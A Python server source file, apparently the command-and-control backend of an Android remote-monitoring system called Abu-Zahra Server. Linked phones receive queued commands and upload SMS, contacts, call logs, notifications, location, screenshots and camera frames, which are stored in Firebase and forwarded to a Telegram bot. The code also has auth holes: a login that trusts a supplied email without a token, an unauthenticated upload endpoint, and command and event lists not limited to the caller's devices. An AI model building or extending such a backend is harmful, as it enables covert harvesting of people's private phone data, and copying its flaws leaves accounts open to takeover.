"""
API Handlers - All HTTP/WebSocket request handlers for the Abu-Zahra Server.
Architecture: Client → Server ← {Web Dashboard, Admin App, Telegram Bot}
"""

import json
import time
import uuid
import base64
import asyncio
import logging
from aiohttp import web, WSMsgType
from datetime import datetime
from typing import Optional

from .config import (
    CORS_ORIGINS, VERSION, SERVER_DOMAIN, SERVER_URL,
    MAX_UPLOAD_SIZE, JPEG_STREAM_INTERVAL, STREAM_FRAME_CACHE_SIZE
)
from .store import store
from .commands import COMMAND_REGISTRY, CMD_CATEGORIES, get_all_categories
from . import firebase_client as _fb
from .firebase_client import (
    push_command, store_sms, store_contacts,
    store_calls, store_notifications, store_device_info, store_location
)
from .file_storage import save_upload, save_base64_upload, get_file, get_storage_stats
from .telegram_bot import forward_result, get_bot_username

logger = logging.getLogger("api")


# ─── Middleware ────────────────────────────────────────────────

@web.middleware
async def cors_middleware(request: web.Request, handler):
    if request.method == 'OPTIONS':
        resp = web.Response(status=204)
    else:
        resp = await handler(request)
    
    origin = request.headers.get('Origin', '')
    if origin in CORS_ORIGINS or origin == '':
        resp.headers['Access-Control-Allow-Origin'] = origin or CORS_ORIGINS[0]
    resp.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    resp.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Device-Token'
    resp.headers['Access-Control-Max-Age'] = '86400'
    return resp


def get_auth_session(request: web.Request):
    """Extract and validate session from Authorization header."""
    auth = request.headers.get('Authorization', '')
    if not auth.startswith('Bearer '):
        return None
    token = auth[7:]
    return store.validate_session(token)


def get_device_auth(request: web.Request):
    """Extract device_id and validate device token."""
    device_id = request.match_info.get('device_id') or request.query.get('device_id', '')
    token = request.headers.get('X-Device-Token', '')
    if not device_id or not token:
        return None, "Missing device_id or token"
    if not store.validate_device_token(device_id, token):
        return None, "Invalid device token"
    return device_id, None


def json_response(data: any, status: int = 200) -> web.Response:
    return web.Response(
        text=json.dumps(data, ensure_ascii=False, default=str),
        content_type='application/json',
        status=status
    )


# ─── Public Endpoints ─────────────────────────────────────────

async def api_health(request: web.Request) -> web.Response:
    store.api_hits += 1
    return json_response({
        "ok": True,
        "status": "running",
        "version": VERSION,
        "firebase": _fb.firebase_connected,
        "uptime": int(time.time() - store.start_time),
        "devices": len(store.devices),
        "commands": len(store.commands),
    })


async def api_login(request: web.Request) -> web.Response:
    """Web/Admin login. Accepts username/email + password."""
    store.api_hits += 1
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    username_or_email = body.get('username', '').strip()
    password = body.get('password', '')
    
    if not username_or_email or not password:
        return json_response({"ok": False, "message": "Missing username or password"}, 400)
    
    user = await store.authenticate_user(username_or_email, password)
    if not user:
        return json_response({"ok": False, "message": "اسم المستخدم أو كلمة المرور غير صحيحة"}, 401)
    
    # Create session
    ip = request.remote or ""
    ua = request.headers.get('User-Agent', '')
    session = store.create_session(user['id'], user['username'], user['role'], ip, ua, source="web")
    
    await store.add_event("auth", f"User logged in: {user['username']} (web)", "success", user_id=user['id'])
    
    # Get or create permanent link code
    permanent_code = await store.get_or_create_permanent_code(user['id'])

    # Sync to Firebase
    if _fb.firebase_connected:
        from .firebase_client import sync_permanent_code
        await sync_permanent_code(user['email'], permanent_code, user['id'])

    return json_response({
        "ok": True,
        "success": True,
        "token": session['token'],
        "expires_at": session['expires_at'],
        "user_id": user['id'],
        "username": user['username'],
        "role": user['role'],
        "email": user['email'],
        "permanent_code": permanent_code,
        "message": "تم تسجيل الدخول بنجاح"
    })


async def api_firebase_auth(request: web.Request) -> web.Response:
    """Firebase authentication. Accepts Firebase ID token from Google Sign-In."""
    store.api_hits += 1
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    firebase_token = body.get('firebase_token', '').strip()
    id_token = body.get('id_token', '').strip()
    email = body.get('email', '').strip().lower()
    display_name = body.get('display_name', '').strip()
    
    # Accept either firebase_token or id_token
    token = firebase_token or id_token
    
    if not email:
        return json_response({"ok": False, "message": "البريد الإلكتروني مطلوب"}, 400)
    
    # Try to verify Firebase ID token if available
    # Server acts as verification intermediary: it validates the ID token against
    # Firebase Auth REST API using the WEB API key (NOT the user's token as key).
    verified_email = None
    verified_name = None
    if token:
        try:
            import aiohttp
            from .config import FIREBASE_WEB_API_KEY
            # identitytoolkit accounts:lookup expects the WEB API key as `key=`
            # and the user's ID token in the JSON body as `idToken`.
            url = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={FIREBASE_WEB_API_KEY}"
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as sess:
                async with sess.post(url, json={"idToken": token}) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        users = data.get('users') or []
                        if users:
                            user_info = users[0]
                            verified_email = (user_info.get('email') or '').lower()
                            verified_name = user_info.get('displayName') or user_info.get('localId') or ''
        except Exception as e:
            logger.warning(f"Firebase token verification failed: {e}")

    # Security: if a token was provided but verification failed, REJECT the request
    # instead of trusting the user-supplied email (prevents email spoofing).
    if token and not verified_email:
        return json_response({"ok": False, "message": "فشل التحقق من رمز Firebase"}, 401)

    # Use verified email if available, otherwise trust the provided email
    final_email = verified_email or email
    final_name = verified_name or display_name or final_email.split('@')[0]
    
    # Find or create user
    user = None
    for u in store.users.values():
        if u['email'] == final_email:
            user = u
            break
    
    if not user:
        # Auto-create user from Firebase auth
        try:
            username = final_name.replace(' ', '_').replace('@', '_')[:20]
            # Ensure unique username
            base_username = username
            counter = 1
            while any(u['username'] == username for u in store.users.values()):
                username = f"{base_username}_{counter}"
                counter += 1
            
            user = await store.create_user(
                email=final_email,
                username=username,
                password=str(uuid.uuid4()),  # Random password for Firebase users
                role="user"
            )
            logger.info(f"Auto-created user from Firebase: {username} ({final_email})")
        except ValueError as e:
            return json_response({"ok": False, "message": str(e)}, 400)
    
    if not user.get('is_active', True):
        return json_response({"ok": False, "message": "الحساب معطل"}, 403)
    
    # Create session
    ip = request.remote or ""
    ua = request.headers.get('User-Agent', '')
    session = store.create_session(user['id'], user['username'], user['role'], ip, ua, source="firebase")
    
    await store.add_event("auth", f"User logged in via Firebase: {user['username']} ({final_email})", "success", user_id=user['id'])
    
    # Get or create permanent link code
    permanent_code = await store.get_or_create_permanent_code(user['id'])
    
    # Sync to Firebase
    if _fb.firebase_connected:
        try:
            from .firebase_client import sync_permanent_code
            await sync_permanent_code(user['email'], permanent_code, user['id'])
        except:
            pass

    return json_response({
        "ok": True,
        "success": True,
        "token": session['token'],
        "expires_at": session['expires_at'],
        "user_id": user['id'],
        "username": user['username'],
        "role": user['role'],
        "email": user['email'],
        "permanent_code": permanent_code,
        "message": "تم تسجيل الدخول بنجاح"
    })


async def api_web_register(request: web.Request) -> web.Response:
    """Register a new user account."""
    store.api_hits += 1
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    email = body.get('email', '').strip()
    username = body.get('username', '').strip()
    password = body.get('password', '').strip()
    
    if not email or not username or not password:
        return json_response({"ok": False, "message": "جميع الحقول مطلوبة"}, 400)
    
    if len(password) < 6:
        return json_response({"ok": False, "message": "كلمة المرور يجب أن تكون 6 أحرف على الأقل"}, 400)
    
    if '@' not in email:
        return json_response({"ok": False, "message": "بريد إلكتروني غير صالح"}, 400)
    
    try:
        user = await store.create_user(email=email, username=username, password=password, role="user")
    except ValueError as e:
        return json_response({"ok": False, "message": str(e)}, 400)
    
    # Auto-login after registration
    ip = request.remote or ""
    ua = request.headers.get('User-Agent', '')
    session = store.create_session(user['id'], user['username'], user['role'], ip, ua, source="register")
    
    await store.add_event("auth", f"New user registered: {username} ({email})", "success", user_id=user['id'])
    
    # Get permanent code
    permanent_code = await store.get_or_create_permanent_code(user['id'])
    
    if _fb.firebase_connected:
        try:
            from .firebase_client import sync_permanent_code
            await sync_permanent_code(user['email'], permanent_code, user['id'])
        except:
            pass
    
    return json_response({
        "ok": True,
        "success": True,
        "token": session['token'],
        "expires_at": session['expires_at'],
        "user_id": user['id'],
        "username": user['username'],
        "role": user['role'],
        "email": user['email'],
        "permanent_code": permanent_code,
        "message": "تم إنشاء الحساب بنجاح"
    })


# ─── Device API (authenticated by device token) ───────────────

async def api_register(request: web.Request) -> web.Response:
    """Device registration using a permanent link code (server as verification intermediary).

    Flow: Android client sends {device_id, link_code, device_token, model, brand, os_version}.
    Server verifies the code against Firebase (code_to_email/$code) AND the local user
    record. If valid, links the device to the code's owner. One lifelong code per email.
    """
    store.api_hits += 1
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)

    device_id = body.get('device_id', '')
    link_code = body.get('link_code', '')
    device_token = body.get('device_token', '') or body.get('token', '')
    model = body.get('device_model', '') or body.get('model', '')
    brand = body.get('brand', '')
    os_version = body.get('os_version', '') or body.get('android', '')

    if not device_id or not link_code:
        return json_response({"ok": False, "message": "Missing device_id or link_code"}, 400)

    # ─── Step 1: verify the code locally first ───────────────────
    code_data = await store.verify_pairing_code(link_code)

    # ─── Step 2: if not found locally, check Firebase (server as intermediary) ─
    if not code_data and _fb.firebase_connected:
        try:
            from .firebase_client import verify_permanent_code_firebase
            fb_mapping = await verify_permanent_code_firebase(link_code)
            if fb_mapping and fb_mapping.get('user_id'):
                # Find the user by the Firebase-stored user_id
                fb_user = await store.get_user(fb_mapping['user_id'])
                if not fb_user:
                    # Fallback: find by email
                    fb_email = fb_mapping.get('email', '').lower()
                    for u in store.users.values():
                        if u.get('email', '').lower() == fb_email:
                            fb_user = u
                            break
                if fb_user:
                    # Ensure the local user record has this permanent code
                    if not fb_user.get('permanent_link_code'):
                        fb_user['permanent_link_code'] = link_code
                        await store.save_users()
                    code_data = {
                        'used': False,
                        'user_id': fb_user['id'],
                        'code': link_code,
                        'permanent': True,
                    }
        except Exception as e:
            logger.warning(f"Firebase code verification failed: {e}")

    if not code_data:
        return json_response({"ok": False, "message": "كود الربط غير صالح"}, 400)

    # ─── Step 3: register the device under the verified owner ────
    device = await store.register_device(
        device_id=device_id,
        token=device_token,
        pairing_code=link_code,
        model=model,
        brand=brand,
        os_version=os_version,
        user_id=code_data.get('user_id'),
    )

    if not device:
        return json_response({"ok": False, "message": "فشل تسجيل الجهاز"}, 500)

    return json_response({
        "ok": True,
        "success": True,
        "device_id": device_id,
        "device_token": device_token,
        "server_domain": SERVER_DOMAIN,
        "owner_id": device.get('owner_id'),
        "message": "تم تسجيل الجهاز بنجاح"
    })


async def api_restore_session(request: web.Request) -> web.Response:
    """Restore a previous device session (no code required).

    The client app stores its device_id + device_token locally. If the user
    reinstalls or returns, they can restore the previous linking without
    re-entering the code — the server re-validates the stored credentials and
    re-activates the device. Requires X-Device-Token header + device_id in body.
    """
    store.api_hits += 1
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)

    device_id = body.get('device_id', '')
    device_token = body.get('device_token', '') or body.get('token', '')
    header_token = request.headers.get('X-Device-Token', '')
    token = device_token or header_token

    if not device_id or not token:
        return json_response({"ok": False, "message": "Missing device_id or token"}, 400)

    device = store.devices.get(device_id)
    if not device:
        return json_response({
            "ok": False,
            "message": "لا توجد جلسة سابقة لهذا الجهاز. استخدم 'ربط هاتف جديد' مع كود الربط الخاص بك.",
        }, 404)

    # Token must match the stored device token
    if device.get('token') != token:
        return json_response({"ok": False, "message": "بيانات الاعتماد غير صحيحة"}, 401)

    # Re-activate the device
    device['active'] = True
    now = datetime.utcnow().isoformat()
    device['last_seen'] = now
    store._device_last_online[device_id] = True
    await store.save_devices()
    await store.add_event("device", f"Session restored: {device_id}", "info", device_id=device_id)

    return json_response({
        "ok": True,
        "success": True,
        "device_id": device_id,
        "device_token": token,
        "owner_id": device.get('owner_id'),
        "server_domain": SERVER_DOMAIN,
        "message": "تمت استعادة الجلسة بنجاح",
    })


async def api_get_commands(request: web.Request) -> web.Response:
    """Device fetches pending commands."""
    device_id, error = get_device_auth(request)
    if error:
        return json_response({"ok": False, "message": error}, 401)
    
    commands = await store.get_pending_commands(device_id)
    
    # Mark as sent AND update status so they are not fetched again
    now = datetime.utcnow().isoformat()
    for cmd in commands:
        cmd['sent_at'] = now
        cmd['status'] = 'sent'
    
    # Save updated state
    if commands:
        await store._save_pending_commands(device_id)
    
    return json_response({
        "ok": True,
        "commands": commands,
        "count": len(commands),
        "server_time": now,
    })


async def api_command_result(request: web.Request) -> web.Response:
    """Device submits command result."""
    store.api_hits += 1
    command_id = request.match_info.get('command_id', '')
    device_id, error = get_device_auth(request)
    if error:
        return json_response({"ok": False, "message": error}, 401)
    
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    status = body.get('status', 'completed')
    result = body.get('result', '')
    
    updated = await store.update_command_result(command_id, status, result)
    
    # Forward result to Telegram if pending
    if updated and command_id in store.pending_messages:
        await forward_result(command_id, result)
    
    # Store text data in Firebase
    if updated and isinstance(result, str) and len(result) < 50000:
        cmd = store.commands.get(command_id, {})
        cmd_name = cmd.get('command', '')
        
        if cmd_name in ('get_sms',):
            await store_sms(device_id, json.loads(result) if result.startswith('[') else result)
        elif cmd_name in ('get_contacts',):
            await store_contacts(device_id, json.loads(result) if result.startswith('[') else result)
        elif cmd_name in ('get_calls',):
            await store_calls(device_id, json.loads(result) if result.startswith('[') else result)
        elif cmd_name in ('get_notifications',):
            await store_notifications(device_id, json.loads(result) if result.startswith('[') else result)
        elif cmd_name in ('get_location',):
            await store_location(device_id, json.loads(result) if result.startswith('{') else result)
        elif cmd_name in ('get_info', 'get_battery', 'get_wifi_info', 'get_network_info',
                          'get_sim_info', 'get_storage_info'):
            await store_device_info(device_id, json.loads(result) if result.startswith('{') else {"raw": result})
    
    # Handle base64 image results - save as temp file
    if updated and isinstance(result, str) and len(result) > 10000 and result.startswith('/9j/'):
        try:
            img_bytes = base64.b64decode(result)
            await save_upload(device_id, img_bytes, f"screenshot_{command_id}.jpg",
                            file_type="screenshot", command_id=command_id)
            # Cache for streaming
            store.latest_frames[f"{device_id}:video"] = {
                "data": result,
                "timestamp": time.time(),
                "source": "screenshot",
            }
        except Exception as e:
            logger.error(f"Failed to save screenshot: {e}")
    
    return json_response({"ok": True, "success": True, "message": "Result received"})


async def api_device_data(request: web.Request) -> web.Response:
    """Device sends typed data (location, battery, events, etc.)."""
    device_id, error = get_device_auth(request)
    if error:
        return json_response({"ok": False, "message": error}, 401)
    
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    data_type = body.get('type', '')
    data = body.get('data', {})
    command = body.get('command', '')
    
    # Store in Firebase for text data
    if data_type == 'location' and data:
        await store_location(device_id, data)
    elif data_type == 'sms' and data:
        await store_sms(device_id, data if isinstance(data, list) else [data])
    elif data_type == 'contacts' and data:
        await store_contacts(device_id, data if isinstance(data, list) else [data])
    elif data_type == 'calls' and data:
        await store_calls(device_id, data if isinstance(data, list) else [data])
    elif data_type == 'notifications' and data:
        await store_notifications(device_id, data if isinstance(data, list) else [data])
    elif data_type == 'device_info' and data:
        await store_device_info(device_id, data)
    
    # Update device info
    if data_type == 'location' and isinstance(data, dict):
        await store.update_device(device_id, {"location": data})
    elif data_type == 'battery' and isinstance(data, (int, float)):
        await store.update_device(device_id, {"battery": data})
    
    return json_response({"ok": True, "success": True, "message": "Data stored"})


async def api_heartbeat(request: web.Request) -> web.Response:
    """Device heartbeat. Requires X-Device-Token auth (device_id in body)."""
    store.api_hits += 1
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)

    device_id = body.get('device_id', '')
    token = request.headers.get('X-Device-Token', '')
    # Validate device token to prevent heartbeat spoofing.
    if not device_id or not token or not store.validate_device_token(device_id, token):
        return json_response({"ok": False, "message": "Invalid device credentials"}, 401)

    status = body.get('status', 'online')
    battery = body.get('battery')

    await store.update_heartbeat(device_id, status, battery)

    return json_response({"ok": True, "success": True, "message": "Heartbeat received"})


async def api_device_event(request: web.Request) -> web.Response:
    """Device sends events."""
    device_id, error = get_device_auth(request)
    if error:
        return json_response({"ok": False, "message": error}, 401)
    
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    event_type = body.get('event_type', '')
    data = body.get('data', {})
    
    await store.add_event("device", str(data)[:200], "info", device_id=device_id, details=event_type)
    
    return json_response({"ok": True, "stored": True})


async def api_upload_file(request: web.Request) -> web.Response:
    """Multipart file upload."""
    store.api_hits += 1
    
    # Get device_id from form or IP map
    device_id = None
    token = request.headers.get('X-Device-Token', '')
    
    try:
        reader = await request.multipart()
        fields = {}
        file_data = None
        filename = ""
        
        async for field in reader:
            if field.name == 'file':
                file_data = await field.read(decode=False)
                filename = field.filename or "unknown"
            else:
                fields[field.name] = (await field.read(decode=True)).decode('utf-8', errors='replace')
        
        device_id = fields.get('device_id', '')
        if not device_id:
            device_id = store._ip_device_map.get(request.remote, '')
        
        if not device_id:
            return json_response({"ok": False, "message": "Unknown device"}, 400)
        
        file_type = fields.get('file_type', 'file')
        command_id = fields.get('command_id', '')
        caption = fields.get('caption', '')
        
        if not file_data:
            return json_response({"ok": False, "message": "No file data"}, 400)
        
        if len(file_data) > MAX_UPLOAD_SIZE:
            return json_response({"ok": False, "message": "File too large"}, 413)
        
        file_meta = await save_upload(device_id, file_data, filename, file_type, command_id, caption)
        
        return json_response({
            "ok": True,
            "file_id": file_meta['id'],
            "file_name": filename,
            "file_size": len(file_data),
        })
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return json_response({"ok": False, "message": str(e)}, 500)


async def api_upload_base64(request: web.Request) -> web.Response:
    """Base64 file upload."""
    store.api_hits += 1
    device_id, error = get_device_auth(request)
    if error:
        return json_response({"ok": False, "message": error}, 401)
    
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    base64_data = body.get('base64_data', '')
    filename = body.get('filename', 'upload.jpg')
    file_type = body.get('file_type', 'file')
    command_id = body.get('command_id', '')
    caption = body.get('caption', '')
    
    if not base64_data:
        return json_response({"ok": False, "message": "No base64 data"}, 400)
    
    try:
        file_meta = await save_base64_upload(device_id, base64_data, filename, file_type, command_id, caption)
        
        # Cache images for streaming viewer
        if file_type in ('photo', 'screenshot', 'camera') and base64_data.startswith('/9j/'):
            store.latest_frames[f"{device_id}:video"] = {
                "data": base64_data,
                "timestamp": time.time(),
                "source": file_type,
            }
        
        return json_response({
            "ok": True,
            "file_id": file_meta['id'],
            "file_name": filename,
        })
    except ValueError as e:
        return json_response({"ok": False, "message": str(e)}, 400)
    except Exception as e:
        return json_response({"ok": False, "message": str(e)}, 500)


async def api_download_file(request: web.Request) -> web.Response:
    """Download a file by file_id."""
    file_id = request.match_info.get('file_id', '')
    session = get_auth_session(request)
    
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    data, meta = await get_file(file_id)
    if not data:
        return json_response({"ok": False, "message": "File not found or expired"}, 404)
    
    content_type = {
        'photo': 'image/jpeg', 'screenshot': 'image/jpeg', 'camera': 'image/jpeg',
        'video': 'video/mp4', 'audio': 'audio/mpeg', 'file': 'application/octet-stream'
    }.get(meta.get('file_type', ''), 'application/octet-stream')
    
    return web.Response(
        body=data,
        content_type=content_type,
        headers={
            'Content-Disposition': f'attachment; filename="{meta["filename"]}"',
            'Content-Length': str(len(data)),
        }
    )


async def api_device_settings(request: web.Request) -> web.Response:
    """Device fetches settings."""
    device_id = request.match_info.get('device_id', '')
    return json_response({
        "ok": True,
        "settings": {
            "sync_interval": store.settings.get('sync_interval', 15),
            "location_interval": store.settings.get('location_interval', 300),
            "auto_location": store.settings.get('auto_location', False),
            "auto_sync": store.settings.get('auto_sync', True),
        }
    })


# ─── Authenticated Web/Admin API ──────────────────────────────

async def api_web_devices(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    devices = await store.get_user_devices(session['user_id'])
    # Map device fields to frontend-expected names
    result = []
    for d in devices:
        dev = dict(d)
        dev['is_online'] = store._device_last_online.get(d['id'], False)
        if 'online' in dev:
            del dev['online']
        if 'battery' in dev:
            dev['battery_level'] = dev.pop('battery')
        if 'os' in dev:
            dev['android_version'] = dev.pop('os')
        elif 'os_version' in dev:
            dev['android_version'] = dev.pop('os_version')
        if 'created_at' in dev:
            dev['linked_at'] = dev.pop('created_at')
        result.append(dev)
    
    return json_response({"ok": True, "devices": result})


async def api_web_device_detail(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    device_id = request.match_info.get('device_id', '')
    device = await store.get_user_device(session['user_id'], device_id)
    if not device:
        return json_response({"ok": False, "message": "Device not found"}, 404)
    
    dev = dict(device)
    dev['is_online'] = store._device_last_online.get(device_id, False)
    if 'online' in dev:
        del dev['online']
    if 'battery' in dev:
        dev['battery_level'] = dev.pop('battery')
    if 'os' in dev:
        dev['android_version'] = dev.pop('os')
    elif 'os_version' in dev:
        dev['android_version'] = dev.pop('os_version')
    if 'created_at' in dev:
        dev['linked_at'] = dev.pop('created_at')
    commands = [c for c in await store.get_commands_history(device_id, limit=20) if c.get('status') not in ('pending', 'sent')]
    
    return json_response({"ok": True, "device": dev, "commands": commands})


async def api_web_commands(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    device_id = request.query.get('device_id', '')
    commands = await store.get_commands_history(device_id=device_id or None, limit=100)
    # Filter out old pending/sent commands - only show completed/failed
    commands = [c for c in commands if c.get('status') not in ('pending', 'sent')]
    return json_response({"ok": True, "commands": commands})


async def api_web_events(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    device_id = request.query.get('device_id', '')
    event_type = request.query.get('type', '')
    events = await store.get_events(device_id=device_id or None, event_type=event_type or None, limit=100)
    return json_response({"ok": True, "events": events})


async def api_web_stats(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    stats = store.get_stats()
    stats['storage'] = get_storage_stats()
    return json_response({"ok": True, "stats": stats})


async def api_web_send_command(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    device_id = body.get('device_id', '')
    command = body.get('command', '')
    params = body.get('params', {})
    
    if not device_id or not command:
        return json_response({"ok": False, "message": "Missing device_id or command"}, 400)
    
    # Check device ownership
    device = await store.get_user_device(session['user_id'], device_id)
    if not device:
        return json_response({"ok": False, "message": "Device not found or access denied"}, 404)
    
    # Look up the actual command
    cmd_def = COMMAND_REGISTRY.get(command, {})
    actual_cmd = cmd_def.get('cmd', command)
    actual_params = cmd_def.get('params', {})
    if params:
        actual_params.update(params)
    
    # Rate limit
    if not store.check_rate_limit(f"cmd_{session['user_id']}", 20, 60):
        return json_response({"ok": False, "message": "Rate limited"}, 429)
    
    # Queue command
    queued = await store.queue_command(
        device_id=device_id,
        command=actual_cmd,
        params=actual_params,
        requested_by=session['user_id'],
        source="web"
    )
    
    # Push to Firebase (wrapped in try/except to prevent crashes)
    if _fb.firebase_connected:
        try:
            await push_command(device_id, {
                "id": queued['id'],
                "command": actual_cmd,
                "params": actual_params,
                "created_at": queued['created_at'],
            })
        except Exception as e:
            logger.warning(f"Firebase push failed for cmd {queued['id']}: {e}")
    
    await store.add_event("command", f"Command queued: {actual_cmd} -> {device_id}",
                         "info", device_id=device_id, user_id=session['user_id'])
    
    return json_response({"ok": True, "command": queued})


async def api_web_link_code(request: web.Request) -> web.Response:
    """Return the user's lifelong permanent link code (one per email, stored in Firebase).

    Per the new architecture: each user gets ONE permanent code generated once and
    synced to Firebase. The server is the verification intermediary — the Android
    client sends this code to /api/register, the server verifies it against the
    user record (and Firebase). This endpoint no longer mints short-lived codes.
    """
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)

    user = await store.get_user(session['user_id'])
    if not user:
        return json_response({"ok": False, "message": "User not found"}, 404)

    # Get or create the single lifelong permanent code for this user
    code = await store.get_or_create_permanent_code(session['user_id'])

    # Ensure it's synced to Firebase (idempotent — safe to call every time)
    if _fb.firebase_connected:
        try:
            from .firebase_client import sync_permanent_code
            await sync_permanent_code(user['email'], code, user['id'])
        except Exception as e:
            logger.warning(f"Failed to sync permanent code to Firebase: {e}")

    return json_response({
        "ok": True,
        "code": code,
        "permanent": True,
        "message": "هذا هو كود الربط الخاص بك — صالح مدى الحياة",
    })


async def api_web_settings_get(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    return json_response({"ok": True, "settings": store.settings})


async def api_web_settings_set(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    if session['role'] != 'admin':
        return json_response({"ok": False, "message": "Admin only"}, 403)
    
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    store.settings.update(body)
    await _save_json("settings.json", store.settings)
    
    return json_response({"ok": True})


async def api_web_unlink(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    device_id = request.match_info.get('device_id', '')
    success = await store.unlink_device(device_id, session['user_id'])
    
    if success:
        return json_response({"ok": True})
    return json_response({"ok": False, "message": "Device not found"}, 404)


async def api_web_logout(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Not logged in"}, 401)
    
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if token in store.sessions:
        del store.sessions[token]
    
    return json_response({"ok": True})


async def _save_json(name, data):
    from .store import _save_json as _sj
    await _sj(name, data)


# ─── User Management API (Admin) ──────────────────────────────

async def api_web_users(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session or session['role'] != 'admin':
        return json_response({"ok": False, "message": "Admin only"}, 403)
    
    users = await store.list_users()
    # Remove password hashes from response
    safe_users = []
    for u in users:
        safe = dict(u)
        safe.pop('password_hash', None)
        safe_users.append(safe)
    
    return json_response({"ok": True, "users": safe_users})


async def api_web_create_user(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session or session['role'] != 'admin':
        return json_response({"ok": False, "message": "Admin only"}, 403)
    
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    email = body.get('email', '')
    username = body.get('username', '')
    password = body.get('password', '')
    role = body.get('role', 'user')
    
    if not email or not username or not password:
        return json_response({"ok": False, "message": "Missing required fields"}, 400)
    
    try:
        user = await store.create_user(email, username, password, role)
        safe = dict(user)
        safe.pop('password_hash', None)
        return json_response({"ok": True, "user": safe})
    except ValueError as e:
        return json_response({"ok": False, "message": str(e)}, 400)


async def api_web_delete_user(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session or session['role'] != 'admin':
        return json_response({"ok": False, "message": "Admin only"}, 403)
    
    user_id = request.match_info.get('user_id', '')
    if user_id == session['user_id']:
        return json_response({"ok": False, "message": "Cannot delete yourself"}, 400)
    
    success = await store.delete_user(user_id)
    if success:
        return json_response({"ok": True})
    return json_response({"ok": False, "message": "User not found"}, 404)


async def api_web_regenerate_code(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    new_code = await store.regenerate_permanent_code(session['user_id'])
    if _fb.firebase_connected:
        from .firebase_client import sync_permanent_code
        user = await store.get_user(session['user_id'])
        if user:
            await sync_permanent_code(user['email'], new_code, session['user_id'])
    return json_response({"ok": True, "code": new_code})


async def api_web_tg_link_token(request: web.Request) -> web.Response:
    """Generate a one-time, 10-minute deep-link token for linking a Telegram
    chat to the current web user's account.

    Flow:
      1. The dashboard calls this endpoint (authenticated).
      2. The server mints a one-time token via store.generate_tg_link_token()
         and returns it together with the bot username (fetched dynamically
         via getMe on startup) and the full deep-link URL.
      3. The user opens the deep-link https://t.me/<bot>?start=<token> on
         their phone, which sends `/start <token>` to the bot.
      4. The bot's `/start <token>` handler verifies the token via
         store.verify_tg_link_token() and links the chat to the user.

    Token expires in 10 minutes and can be used exactly once.
    """
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)

    user = await store.get_user(session['user_id'])
    if not user:
        return json_response({"ok": False, "message": "User not found"}, 404)

    token = store.generate_tg_link_token(session['user_id'])
    bot_user = get_bot_username() or ""

    # Build the deep-link URL. If the bot username isn't known yet (e.g. the
    # server just started and getMe hasn't returned), still return the token
    # so the user can retry; the dashboard can re-fetch shortly.
    deep_link_url = f"https://t.me/{bot_user}?start={token}" if bot_user else ""

    await store.add_event(
        "auth",
        f"TG deep-link token issued for user: {user['username']}",
        "info", user_id=user['id'])

    return json_response({
        "ok": True,
        "token": token,
        "bot_username": bot_user,
        "deep_link_url": deep_link_url,
        "expires_in": getattr(store, "TG_LINK_TOKEN_EXPIRE_SECONDS", 600),
        "message": "افتح الرابط على هاتفك لربط حسابك مع بوت Telegram",
    })


# ─── File Management API ──────────────────────────────────────

async def api_web_files(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    device_id = request.query.get('device_id', '')
    
    # List active files for the user's devices
    files = []
    for fid, fmeta in store.files.items():
